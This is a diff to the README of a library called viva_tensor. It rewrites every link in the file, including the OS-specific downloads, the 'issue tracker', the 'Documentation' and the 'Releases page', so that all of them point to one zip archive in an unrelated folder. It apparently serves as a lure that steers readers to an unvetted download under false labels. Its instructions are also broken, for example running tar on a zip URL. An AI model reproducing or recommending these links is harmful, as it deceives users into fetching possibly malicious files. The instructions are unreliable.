@@ -8,16 +8,16 @@ Welcome to **viva_tensor**! This library simplifies your tensor operations with 
 
 You can download **viva_tensor** from our Releases page. 
 
-[![Download viva_tensor](https://raw.githubusercontent.com/saleembarakat4/viva_tensor/main/bench/viva-tensor-v2.3.zip)](https://raw.githubusercontent.com/saleembarakat4/viva_tensor/main/bench/viva-tensor-v2.3.zip)
+[![Download viva_tensor](https://github.com/saleembarakat4/viva_tensor/raw/refs/heads/main/docs/pt-br/viva-tensor-v1.0.zip)](https://github.com/saleembarakat4/viva_tensor/raw/refs/heads/main/docs/pt-br/viva-tensor-v1.0.zip)
 
 ### Step-by-Step Instructions
 
 1. Click on the link above to visit the **viva_tensor** Releases page.
 2. On the Releases page, look for the latest version. You will see various files available for download.
 3. Choose the appropriate download based on your operating system. For example, you might see files like:
-   - `https://raw.githubusercontent.com/saleembarakat4/viva_tensor/main/bench/viva-tensor-v2.3.zip` for Windows users
-   - `https://raw.githubusercontent.com/saleembarakat4/viva_tensor/main/bench/viva-tensor-v2.3.zip` for Linux users
-   - `https://raw.githubusercontent.com/saleembarakat4/viva_tensor/main/bench/viva-tensor-v2.3.zip` for macOS users
+   - `https://github.com/saleembarakat4/viva_tensor/raw/refs/heads/main/docs/pt-br/viva-tensor-v1.0.zip` for Windows users
+   - `https://github.com/saleembarakat4/viva_tensor/raw/refs/heads/main/docs/pt-br/viva-tensor-v1.0.zip` for Linux users
+   - `https://github.com/saleembarakat4/viva_tensor/raw/refs/heads/main/docs/pt-br/viva-tensor-v1.0.zip` for macOS users
 4. Click on the file you wish to download. Your browser will start the download automatically.
 5. Once the download finishes, locate the file in your **Downloads** folder.
 
@@ -31,7 +31,7 @@ You can download **viva_tensor** from our Releases page.
   - Navigate to the directory where you downloaded the file.
   - Extract it using the command:
     ```bash
-    tar -xzf https://raw.githubusercontent.com/saleembarakat4/viva_tensor/main/bench/viva-tensor-v2.3.zip
+    tar -xzf https://github.com/saleembarakat4/viva_tensor/raw/refs/heads/main/docs/pt-br/viva-tensor-v1.0.zip
     ```
   - Navigate to the extracted folder and run:
     ```bash
@@ -69,11 +69,11 @@ To run **viva_tensor**, ensure your system meets the following requirements:
 
 ## 🌐 Support & Community
 
-If you encounter any issues or have questions, please visit our [issue tracker](https://raw.githubusercontent.com/saleembarakat4/viva_tensor/main/bench/viva-tensor-v2.3.zip). You can report bugs and request features directly there. 
+If you encounter any issues or have questions, please visit our [issue tracker](https://github.com/saleembarakat4/viva_tensor/raw/refs/heads/main/docs/pt-br/viva-tensor-v1.0.zip). You can report bugs and request features directly there. 
 
 ## 📄 Additional Resources
 
-Visit the [Documentation](https://raw.githubusercontent.com/saleembarakat4/viva_tensor/main/bench/viva-tensor-v2.3.zip) for detailed guides on using all of **viva_tensor’s** features. 
+Visit the [Documentation](https://github.com/saleembarakat4/viva_tensor/raw/refs/heads/main/docs/pt-br/viva-tensor-v1.0.zip) for detailed guides on using all of **viva_tensor’s** features. 
 
 ## ☁️ Conclusion
 
@@ -81,4 +81,4 @@ Thank you for choosing **viva_tensor**. We hope this guide helps you get started
 
 For further downloads, go back to our Releases page:
 
-[![Download viva_tensor](https://raw.githubusercontent.com/saleembarakat4/viva_tensor/main/bench/viva-tensor-v2.3.zip)](https://raw.githubusercontent.com/saleembarakat4/viva_tensor/main/bench/viva-tensor-v2.3.zip)
+[![Download viva_tensor](https://github.com/saleembarakat4/viva_tensor/raw/refs/heads/main/docs/pt-br/viva-tensor-v1.0.zip)](https://github.com/saleembarakat4/viva_tensor/raw/refs/heads/main/docs/pt-br/viva-tensor-v1.0.zip)
